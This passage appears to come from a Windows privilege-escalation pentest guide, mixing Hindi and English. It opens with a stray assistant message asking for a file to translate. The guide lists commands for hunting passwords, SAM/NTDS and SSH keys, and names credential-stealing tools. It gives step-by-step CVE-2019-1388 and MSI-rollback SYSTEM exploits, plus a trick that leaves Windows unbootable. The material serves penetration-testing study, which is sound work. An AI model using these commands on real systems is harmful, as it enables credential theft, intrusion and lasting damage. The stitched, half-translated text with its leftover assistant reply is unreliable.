I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/README.md or the other proposed files. Please paste the file(s) content you want translated, or grant access/provide the list of files to search.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### रीसायकल बिन में क्रेडेंशियल्स

क्रेडेंशियल्स को खोजने के लिए आपको रीसायकल बिन की भी जांच करनी चाहिए।

कई प्रोग्रामों द्वारा सेव किए गए **पासवर्ड्स को पुनः प्राप्त करने** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**क्रेडेंशियल्स वाले अन्य संभावित रजिस्ट्री कीज़**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र इतिहास

You should check for dbs where passwords from **Chrome or Firefox** are stored.\  
Also check for the history, bookmarks and favourites of the browsers so maybe some **passwords are** stored there.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर बनी एक technology है जो अलग-अलग भाषाओं के software components के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality एक्सपोज़ करता है, जिन्हें interface IDs (IIDs) के माध्यम से पहचाना जाता है।

COM classes और interfaces registry के तहत परिभाषित होते हैं: **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** क्रमशः। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** को merge करके बनाई जाती है।

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Basically, if you can **overwrite any of the DLLs** that are going to be executed, you could **escalate privileges** if that DLL is going to be executed by a different user.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **सामान्य Password खोज फ़ाइलों और रजिस्ट्री में**

**फ़ाइल सामग्री के लिए खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइल नाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### ऐसे टूल्स जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है। मैंने यह plugin बनाया है ताकि यह **metasploit POST module** जो लक्ष्य के अंदर credentials की खोज करता है, स्वतः चला सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से उन सभी फाइलों की खोज करता है जिनमें इस पेज में उल्लिखित passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से password निकालने के लिए एक और शानदार टूल है।

टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई टूल्स के **sessions**, **usernames** और **passwords** खोजता है जो इस डेटा को clear text में सेव करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रही एक process ने एक नया process open किया** (`OpenProcess()`) **जिसे full access मिला है**। वही process **एक नया process भी बनाती है** (`CreateProcess()`) **जो low privileges के साथ चलता है लेकिन main process के सभी open handles को inherit करता है**।\
फिर, यदि आपके पास **low privileged process तक full access** है, तो आप `OpenProcess()` के साथ बनाए गए privileged process के **open handle** को पकड़कर **एक shellcode inject कर सकते हैं**।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें सामान्यतः **pipes** कहा जाता है, प्रक्रियाओं के बीच संचार और डेटा ट्रांसफ़र को सक्षम करते हैं।

Windows एक फीचर प्रदान करता है जिसका नाम **Named Pipes** है, जो unrelated processes को डेटा साझा करने की अनुमति देता है, यहाँ तक कि विभिन्न नेटवर्कों पर भी। यह एक client/server architecture जैसा दिखता है, जहाँ भूमिकाएँ **named pipe server** और **named pipe client** के रूप में परिभाषित होती हैं।

जब कोई **client** किसी pipe के माध्यम से डेटा भेजता है, तो वह **server** जिसने pipe सेट किया है, पास मौजूद **SeImpersonate** अधिकार होने पर उस **client** की पहचान को **अपनाने** की क्षमता रखता है। किसी ऐसे **privileged process** की पहचान करना जो उस pipe के माध्यम से संवाद करता है जिसे आप mimic कर सकते हैं, आपको मौका देता है कि जब वह प्रक्रिया आपके द्वारा स्थापित pipe से इंटरैक्ट करे तो आप उसकी पहचान अपनाकर **higher privileges प्राप्त कर सकें**। इस तरह के हमले को निष्पादित करने के निर्देशों के लिए उपयोगी गाइड [**यहां**](named-pipe-client-impersonation.md) और [**यहां**](#from-high-integrity-to-system) उपलब्ध हैं।

साथ ही निम्नलिखित tool आपको **named pipe communication को burp जैसे tool के साथ intercept करने** की सुविधा देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देख कर privescs खोजने की अनुमति देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### File Extensions that could execute stuff in Windows

पेज देखें: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो ऐसे scheduled tasks या अन्य processes चल रहे हो सकते हैं जो **command line पर credentials पास करते हैं**। नीचे दिया गया script हर दो सेकंड में process command lines कैप्चर करता है और वर्तमान स्थिति की तुलना पिछले स्थिति से करता है, और किसी भी परिवर्तन को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रोसेस से पासवर्ड चुराना

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (console या RDP के माध्यम से) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में unprivileged user से "NT\AUTHORITY SYSTEM" जैसे terminal या किसी अन्य process को चलाना संभव है।

इससे समान vulnerability के जरिए एक ही समय में privileges escalate करना और UAC bypass करना संभव हो जाता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और प्रक्रिया में उपयोग किया गया binary Microsoft द्वारा signed और जारी किया गया है।

प्रभावित सिस्टमों में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित कदम आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

The attack basically consist of abusing the Windows Installer's rollback feature to replace legitimate files with malicious ones during the uninstallation process. For this the attacker needs to create a **malicious MSI installer** that will be used to hijack the `C:\Config.Msi` folder, which will later be used by he Windows Installer to store rollback files during the uninstallation of other MSI packages where the rollback files would have been modified to contain the malicious payload.

The summarized technique is the following:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **इंडेक्स मेटाडेटा** संग्रहीत करता है।

इसलिए, अगर आप किसी फ़ोल्डर का **`::$INDEX_ALLOCATION` stream हटाते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरा फ़ोल्डर हटा देता है**।

आप यह काम मानक file deletion APIs जैसे उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद फ़ोल्डर को डिलीट कर देता है**।

### फ़ोल्डर की सामग्री को हटाने से SYSTEM EoP तक
क्या होगा अगर आपकी primitive आपको मनमाने files/folders हटाने की अनुमति नहीं देती, लेकिन यह **attacker-controlled फ़ोल्डर की *contents* को हटाने की अनुमति देती है**?

1. चरण 1: एक bait फ़ोल्डर और file सेटअप करें
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. चरण 2: `file1.txt` पर एक **oplock** लगाएं
- वह oplock **निष्पादन को रोक देता है** जब कोई privileged process `file1.txt` को हटाने की कोशिश करता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM process को ट्रिगर करें (जैसे `SilentCleanup`)
- यह प्रक्रिया फोल्डरों (जैसे, `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुंचता है, तो **oplock triggers** और कंट्रोल आपके callback को सौंप देता है।

4. चरण 4: oplock callback के अंदर – deletion को redirect करें

- विकल्प A: `file1.txt` को कहीं और स्थानांतरित करें
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- सीधे `file1.txt` को हटाएँ नहीं — इससे oplock समय से पहले मुक्त हो जाएगा।

- विकल्प B: `folder1` को **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS का आंतरिक स्ट्रीम है जो फ़ोल्डर metadata को स्टोर करता है — इसे हटाने से फ़ोल्डर भी हट जाता है।

5. चरण 5: oplock जारी करें
- SYSTEM प्रक्रिया जारी रहती है और `file1.txt` को हटाने की कोशिश करती है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में निम्नलिखित को हटाया जा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटाया जाता है।

### Arbitrary फ़ोल्डर बनाने से स्थायी DoS तक

ऐसे primitive का उपयोग करें जो आपको **SYSTEM/admin के रूप में किसी भी arbitrary फ़ोल्डर को बनाना** संभव बनाता है — भले ही **आप फ़ाइलें लिख न सकें** या **कमज़ोर अनुमतियाँ सेट न कर सकें**।

एक **फ़ोल्डर** (फ़ाइल नहीं) बनाएं जिसका नाम किसी **critical Windows driver** के नाम जैसा हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह पथ सामान्यतः `cng.sys` kernel-mode ड्राइवर से संबंधित होता है।
- यदि आप इसे पहले से **एक फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट के समय वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर को देखता है, **वास्तविक ड्राइवर को पहचानकर/लोड करने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बिना बाहरी हस्तक्षेप (जैसे, boot repair या disk access) के **कोई fallback नहीं**, और **कोई recovery नहीं**।


## **High Integrity से System तक**

### **नई सेवा**

यदि आप पहले से ही High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** बस **एक नई सेवा बनाकर और उसे निष्पादित करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक वैध service हो या binary आवश्यक क्रियाएँ तेजी से करे क्योंकि यदि यह वैध service नहीं है तो उसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने की कोशिश कर सकते हैं और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** कर सकते हैं।\
[यहाँ registry keys और _.msi_ package कैसे install करें इसके बारे में अधिक जानकारी।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**यहाँ code पा सकते हैं**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (शायद आप इन्हें पहले से किसी High Integrity process में पाएंगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (not protected processes) को खोल सकेंगे, process का **token copy** कर पाएंगे, और उस token के साथ कोई भी arbitrary process create कर सकते हैं।\
इस technique में आमतौर पर SYSTEM पर चल रहे किसी process को चुना जाता है जिसमें सभी token privileges हों (_हाँ, आप SYSTEM processes पाएंगे जिनमें सभी token privileges न हों_).\
**आप** [**यहाँ इस technique को execute करने वाले example code पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा getsystem में escalate करने के लिए उपयोग होती है। यह तकनीक एक pipe बनाने और फिर उस pipe पर लिखने के लिए किसी service को create/abuse करने पर आधारित है। फिर वह **server** जिसने pipe बनाया है और जिसने **`SeImpersonate`** privilege का उपयोग किया है, वह pipe client (service) के **token** को impersonate कर के SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation).\
यदि आप उदाहरण पढ़ना चाहते हैं कि [**कैसे high integrity से name pipes का उपयोग करके System तक पहुँचा जा सकता है**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

यदि आप किसी SYSTEM के रूप में चल रही process द्वारा load की जा रही किसी dll को **hijack** करने में सफल हो जाते हैं तो आप उन permissions के साथ arbitrary code execute कर पाएंगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए भी उपयोगी है, और साथ ही यह high integrity process से हासिल करना कहीं अधिक आसान होता है क्योंकि उसके पास dlls को load करने वाले folders पर **write permissions** मौजूद होते हैं।\
**आप** [**यहाँ Dll hijacking के बारे में और पढ़ सकते हैं**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- संभावित misconfigurations की जाँच और जानकारी इकट्ठा करें (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। local में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- इकट्ठे किए गए पासवर्ड्स को domain पर spray करता है**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc vulnerabilities खोजें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin rights आवश्यक)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजें (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host को enumerate करता है (ज़्यादा जानकारी इकट्ठा करने वाला tool; needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe मौजूद)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration की जाँच (executable github पर precompiled). सिफारिश नहीं। Win10 पर अच्छा काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe). सिफारिश नहीं। Win10 पर अच्छा काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट पर आधारित टूल (properly काम करने के लिए accesschk की आवश्यकता नहीं पर यह इसका उपयोग कर सकता है).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़कर काम करने वाले exploits सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको प्रोजेक्ट को सही .NET version का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). victim host पर इंस्टॉल की गई .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
